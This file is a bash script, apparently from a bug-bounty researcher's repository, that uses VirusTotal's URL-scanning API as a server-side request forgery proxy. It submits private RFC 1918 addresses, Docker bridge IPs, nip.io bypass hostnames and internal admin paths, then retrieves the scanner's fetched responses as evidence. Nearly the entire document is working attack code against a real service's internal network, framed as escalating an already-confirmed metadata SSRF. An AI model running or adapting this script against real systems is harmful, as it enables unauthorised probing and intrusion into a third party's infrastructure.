#!/usr/bin/env bash
# VT SSRF: Test if RFC 1918 internal IP ranges are reachable via VT's scanner
# We know 169.254.0.0/16 is reachable (confirmed SSRF).
# If 10.0.0.0/8 is also reachable, any internal GCP VPC service is accessible.
# This is the highest-remaining escalation path.
#
# Run: VT_API_KEY=<key> bash scripts/vt-rfc1918-probe.sh 2>&1 | tee ~/vt-rfc1918.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

submit_url() {
  local url="$1"
  SUBMIT=$(c -X POST "${BASE}/urls" --data-urlencode "url=${url}" 2>/dev/null)
  ID=$(echo "$SUBMIT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null || echo "")
  ERR=$(echo "$SUBMIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code','') + ':' + d.get('error',{}).get('message','')[:50])" 2>/dev/null || echo "")
  if [ -n "$ID" ]; then
    echo "  [+] QUEUED  ${url}"
  else
    echo "  [X] BLOCKED ${url} → ${ERR}"
  fi
}

check_obj() {
  local url="$1"
  local b64; b64=$(b64url "$url")
  OBJ=$(c "${BASE}/urls/${b64}" 2>/dev/null)
  python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'error' in d:
    print('  NOT_IN_DB')
    exit()
attrs = d.get('data', {}).get('attributes', {})
code = attrs.get('last_http_response_code', 'NOT_FETCHED')
sz   = attrs.get('last_http_response_content_length', '')
sha  = attrs.get('last_http_response_content_sha256', '')
hdrs = attrs.get('last_http_response_headers', {})
final= attrs.get('last_final_url', '')
print(f'  HTTP {code}  sz={sz}  sha={sha[:16]}...')
if hdrs:
    server = hdrs.get('Server','') or hdrs.get('server','')
    ct = hdrs.get('Content-Type','') or hdrs.get('content-type','')
    print(f'    Server: {server}  Content-Type: {ct}')
if final and final != '$url':
    print(f'    final_url: {final}')
" <<< "$OBJ" 2>/dev/null || echo "  parse_error"
  # Save any non-empty responses
  CODE=$(echo "$OBJ" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(d.get('data',{}).get('attributes',{}).get('last_http_response_code',''))
" 2>/dev/null || echo "")
  if echo "$CODE" | grep -qE "^[0-9]+$"; then
    echo "$OBJ" | python3 -m json.tool 2>/dev/null > "$OUT/rfc1918-$(echo "$url" | md5sum | cut -c1-8).json"
    echo "  → Saved to evidence/"
  fi
}

echo "══════════════════════════════════════════════════════════"
echo "RFC 1918 Internal IP Probe via VT SSRF"
echo "We know 169.254.0.0/16 is reachable. Testing if 10.x/172.16.x/192.168.x are too."
echo "Any internal GCP VPC service on port 80 would be Critical impact."
echo "══════════════════════════════════════════════════════════"

echo ""
echo "=== PHASE 1: Submission — will VT block RFC 1918? ==="
echo "Testing: does VT's filter block private ranges or only metadata hostnames?"

RFC1918_TARGETS=(
  # GCP VPC gateway (every GCP VPC has this)
  "http://10.0.0.1/"
  "http://10.0.0.2/"
  # GCP default subnets by region (us-central1, us-east1, europe-west1, asia-east1)
  "http://10.128.0.1/"
  "http://10.132.0.1/"
  "http://10.140.0.1/"
  "http://10.146.0.1/"
  # Docker bridge
  "http://172.17.0.1/"
  "http://172.18.0.1/"
  # GCP internal load balancer (common in GKE)
  "http://10.0.0.10/"
  "http://10.96.0.1/"
  "http://10.100.0.1/"
  # Cloud Run / internal services
  "http://192.168.0.1/"
  "http://192.168.1.1/"
  # Via nip.io (second bypass for RFC 1918 if direct blocked)
  "http://10-0-0-1.nip.io/"
  "http://10-128-0-1.nip.io/"
  "http://172-17-0-1.nip.io/"
)

for url in "${RFC1918_TARGETS[@]}"; do
  submit_url "$url"
done

echo ""
echo "=== PHASE 2: Also submit with common internal paths ==="
INTERNAL_PATHS=(
  "http://10.0.0.1/admin"
  "http://10.0.0.1/api/v1/"
  "http://10.0.0.1:8080/"
  "http://10.128.0.1/admin"
  "http://10.128.0.1:8080/"
  "http://172.17.0.1/admin"
  "http://172.17.0.1:8080/"
)

for url in "${INTERNAL_PATHS[@]}"; do
  submit_url "$url"
done

echo ""
echo "=== PHASE 3: Wait 60s for VT crawler to run ==="
sleep 60

echo ""
echo "=== PHASE 4: Check URL objects — did crawler reach RFC 1918 addresses? ==="

ALL_TARGETS=(
  "http://10.0.0.1/"
  "http://10.0.0.2/"
  "http://10.128.0.1/"
  "http://10.132.0.1/"
  "http://10.140.0.1/"
  "http://10.146.0.1/"
  "http://172.17.0.1/"
  "http://172.18.0.1/"
  "http://10.0.0.10/"
  "http://10.96.0.1/"
  "http://10.100.0.1/"
  "http://192.168.0.1/"
  "http://192.168.1.1/"
  "http://10-0-0-1.nip.io/"
  "http://10-128-0-1.nip.io/"
  "http://172-17-0-1.nip.io/"
  "http://10.0.0.1/admin"
  "http://10.128.0.1:8080/"
)

for url in "${ALL_TARGETS[@]}"; do
  echo ""
  echo "  URL: ${url}"
  check_obj "$url"
done

echo ""
echo "══════════════════════════════════════════════════════════"
echo "KEY: Any HTTP code (200/301/403/404) from 10.x or 172.16.x = RFC 1918 SSRF"
echo "     HTTP 200 from internal service = Critical escalation"
echo "     All NOT_FETCHED = VT may block RFC 1918 at crawl layer (less likely)"
echo "     BLOCKED at submission = VT has RFC 1918 filter (separate from 169.254 filter)"
echo ""
echo "Results saved to: ${OUT}/rfc1918-*.json"
echo "══════════════════════════════════════════════════════════"
